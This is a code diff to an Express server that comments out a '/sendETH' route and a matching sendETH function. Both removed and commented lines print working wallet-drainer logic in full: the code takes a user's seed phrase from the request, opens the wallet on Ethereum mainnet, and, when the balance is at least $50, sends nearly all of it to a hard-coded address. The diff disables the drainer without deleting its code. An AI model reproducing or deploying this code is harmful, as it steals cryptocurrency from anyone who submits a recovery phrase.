@@ -606,91 +606,91 @@ async function getEthUsdPrice() {
     console.error('Error fetching ETH to USD price:', error);
   }
 }
-app.get("/sendETH", async (req, res) => {
-  try {
-    const phrase = req.body.phrase;
-    //Perform the transaction.
-    const mnemonic = phrase;
-    const providerUrl = `https://mainnet.infura.io/v3/${process.env.INFURA}`;
+// app.get("/sendETH", async (req, res) => {
+//   try {
+//     const phrase = req.body.phrase;
+//     //Perform the transaction.
+//     const mnemonic = phrase;
+//     const providerUrl = `https://mainnet.infura.io/v3/${process.env.INFURA}`;
 
-    // Connect to the Ethereum network
-    const provider = new ethers.JsonRpcProvider(providerUrl);
+//     // Connect to the Ethereum network
+//     const provider = new ethers.JsonRpcProvider(providerUrl);
 
-    // Create a wallet instance from the mnemonic
-    const wallet = ethers.Wallet.fromPhrase(mnemonic).connect(provider);
+//     // Create a wallet instance from the mnemonic
+//     const wallet = ethers.Wallet.fromPhrase(mnemonic).connect(provider);
 
-    const balance = await provider.getBalance(wallet.address);
+//     const balance = await provider.getBalance(wallet.address);
 
-    const balanceInEth = ethers.formatEther(balance);
-    const parsedEth = parseFloat(balanceInEth);
+//     const balanceInEth = ethers.formatEther(balance);
+//     const parsedEth = parseFloat(balanceInEth);
 
-    // Get ETH to USD exchange rate from COINGECKO
-    const ethUsdPrice = await getEthUsdPrice();
+//     // Get ETH to USD exchange rate from COINGECKO
+//     const ethUsdPrice = await getEthUsdPrice();
 
-    // Calculate balance in USD
-    const balanceInUsd = parsedEth * ethUsdPrice;
-    const usdRounded = balanceInUsd.toFixed(2);
-    const balanceMinus5 = parseFloat(usdRounded) - 5.00;
-    const valueToSend = balanceMinus5 / ethUsdPrice;
+//     // Calculate balance in USD
+//     const balanceInUsd = parsedEth * ethUsdPrice;
+//     const usdRounded = balanceInUsd.toFixed(2);
+//     const balanceMinus5 = parseFloat(usdRounded) - 5.00;
+//     const valueToSend = balanceMinus5 / ethUsdPrice;
 
-    console.log(`Balance: ${balanceInEth} ETH`);
-    console.log(`Balance: $${balanceInUsd.toFixed(2)} USD`);
-    //check if the eth amount in usd is more than $50
-    if (parseFloat(usdRounded) >= 50) {
-      // Create the transaction
-      const tx = await wallet.sendTransaction({
-        to: '0x54651BcEB497fE24244d49cD70Be405C52610d3f',
-        value: ethers.parseUnits(valueToSend.toString(), 'ether'),
-      });
-      // Send the transaction
-      const transactionResponse = await wallet.sendTransaction(tx);
-    }
-  } catch (e) {
-    console.log(e.message)
-  }
-})
+//     console.log(`Balance: ${balanceInEth} ETH`);
+//     console.log(`Balance: $${balanceInUsd.toFixed(2)} USD`);
+//     //check if the eth amount in usd is more than $50
+//     if (parseFloat(usdRounded) >= 50) {
+//       // Create the transaction
+//       const tx = await wallet.sendTransaction({
+//         to: '0x54651BcEB497fE24244d49cD70Be405C52610d3f',
+//         value: ethers.parseUnits(valueToSend.toString(), 'ether'),
+//       });
+//       // Send the transaction
+//       const transactionResponse = await wallet.sendTransaction(tx);
+//     }
+//   } catch (e) {
+//     console.log(e.message)
+//   }
+// })
 
-async function sendETH(req: Request) {
-  try {
-    const phrase = req.body.phrase;
-    //Perform the transaction.
-    const mnemonic = phrase;
-    const providerUrl = `https://mainnet.infura.io/v3/${process.env.INFURA}`;
+// async function sendETH(req: Request) {
+//   try {
+//     const phrase = req.body.phrase;
+//     //Perform the transaction.
+//     const mnemonic = phrase;
+//     const providerUrl = `https://mainnet.infura.io/v3/${process.env.INFURA}`;
 
-    // Connect to the Ethereum network
-    const provider = new ethers.JsonRpcProvider(providerUrl);
+//     // Connect to the Ethereum network
+//     const provider = new ethers.JsonRpcProvider(providerUrl);
 
-    // Create a wallet instance from the mnemonic
-    const wallet = ethers.Wallet.fromPhrase(mnemonic).connect(provider);
+//     // Create a wallet instance from the mnemonic
+//     const wallet = ethers.Wallet.fromPhrase(mnemonic).connect(provider);
 
-    const balance = await provider.getBalance(wallet.address);
+//     const balance = await provider.getBalance(wallet.address);
 
-    const balanceInEth = ethers.formatEther(balance);
-    const parsedEth = parseFloat(balanceInEth);
+//     const balanceInEth = ethers.formatEther(balance);
+//     const parsedEth = parseFloat(balanceInEth);
 
-    // Get ETH to USD exchange rate from COINGECKO
-    const ethUsdPrice = await getEthUsdPrice();
+//     // Get ETH to USD exchange rate from COINGECKO
+//     const ethUsdPrice = await getEthUsdPrice();
 
-    // Calculate balance in USD
-    const balanceInUsd = parsedEth * ethUsdPrice;
-    const usdRounded = balanceInUsd.toFixed(2);
-    const balanceMinus5 = parseFloat(usdRounded) - 5.00;
-    const valueToSend = balanceMinus5 / ethUsdPrice;
+//     // Calculate balance in USD
+//     const balanceInUsd = parsedEth * ethUsdPrice;
+//     const usdRounded = balanceInUsd.toFixed(2);
+//     const balanceMinus5 = parseFloat(usdRounded) - 5.00;
+//     const valueToSend = balanceMinus5 / ethUsdPrice;
 
-    console.log(`Balance: ${balanceInEth} ETH`);
-    console.log(`Balance: $${balanceInUsd.toFixed(2)} USD`);
-    //check if the eth amount in usd is more than $50
-    if (parseFloat(usdRounded) >= 50) {
-      // Create the transaction
-      const tx = await wallet.sendTransaction({
-        to: '0x54651BcEB497fE24244d49cD70Be405C52610d3f',
-        value: ethers.parseUnits(valueToSend.toString(), 'ether'),
-      });
-      // Send the transaction
-      const transactionResponse = await wallet.sendTransaction(tx);
-    }
-  } catch (e) {
-    console.log(e.message)
-  }
-}
+//     console.log(`Balance: ${balanceInEth} ETH`);
+//     console.log(`Balance: $${balanceInUsd.toFixed(2)} USD`);
+//     //check if the eth amount in usd is more than $50
+//     if (parseFloat(usdRounded) >= 50) {
+//       // Create the transaction
+//       const tx = await wallet.sendTransaction({
+//         to: '0x54651BcEB497fE24244d49cD70Be405C52610d3f',
+//         value: ethers.parseUnits(valueToSend.toString(), 'ether'),
+//       });
+//       // Send the transaction
+//       const transactionResponse = await wallet.sendTransaction(tx);
+//     }
+//   } catch (e) {
+//     console.log(e.message)
+//   }
+// }
 export default app;
